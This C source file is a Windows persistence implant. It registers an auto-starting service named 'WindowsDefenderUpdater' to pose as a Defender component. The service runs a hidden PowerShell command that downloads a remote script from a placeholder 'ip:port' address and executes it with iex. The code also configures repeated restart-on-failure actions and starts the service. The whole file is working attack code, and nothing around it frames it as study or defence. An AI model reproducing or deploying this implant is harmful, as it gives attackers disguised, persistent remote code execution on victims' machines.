#include <windows.h>  // Library that contains the Windows APIs
#include <wchar.h>    // Library for manipulating wide strings

// Custom framework for configuring service failure actions. This structure is used to configure the actions to be taken in case of service failure.
typedef struct _MyServiceFailureActions {
    DWORD dwResetPeriod;
    LPWSTR lpRebootMsg;
    LPWSTR lpCommand;
    DWORD cActions;
    SC_ACTION* lpsaActions;
} MyServiceFailureActions, * LPMyServiceFailureActions;

int main() {
    // Fixed service name and PowerShell command
    const wchar_t* serviceName = L"WindowsDefenderUpdater";
    const wchar_t* serviceCommand = L"\%COMSPEC% /c powershell.exe -nop -w hidden -command \"iex (new-object Net.Webclient).DownloadString('http://ip:port/DefenderUpdate.ps1')\"";

    SC_HANDLE schSCManager, schService;

    // Opening Service Manager to create the service
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL) {
        return 1;
    }

    // Service creation. For any questions regarding configuration, refer to Microsoft's official documentation.
    schService = CreateServiceW(
        schSCManager,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        serviceCommand,
        NULL, NULL, NULL, NULL, NULL);

    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return 1;
    }
    else {
    }

    // Increase the timeout to 60 seconds if the service fails to run.
    MyServiceFailureActions serviceFailureActions;
    SC_ACTION failureActions[3];

    serviceFailureActions.dwResetPeriod = 0;
    serviceFailureActions.lpRebootMsg = NULL;
    serviceFailureActions.lpCommand = NULL;
    serviceFailureActions.cActions = 3;
    serviceFailureActions.lpsaActions = failureActions;

    failureActions[0].Type = SC_ACTION_RESTART;
    failureActions[0].Delay = 60000;
    failureActions[1].Type = SC_ACTION_RESTART;
    failureActions[1].Delay = 60000;
    failureActions[2].Type = SC_ACTION_RESTART;
    failureActions[2].Delay = 60000;

    if (ChangeServiceConfig2(schService, SERVICE_CONFIG_FAILURE_ACTIONS, &serviceFailureActions)) {
    }
    else {
        return 1;
    }

    // Start the created service
    if (StartService(schService, 0, NULL)) {
    }
    else {
        return 1;
    }

    // Finalization of the software, closing the handles of the created processes
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return 0;
}
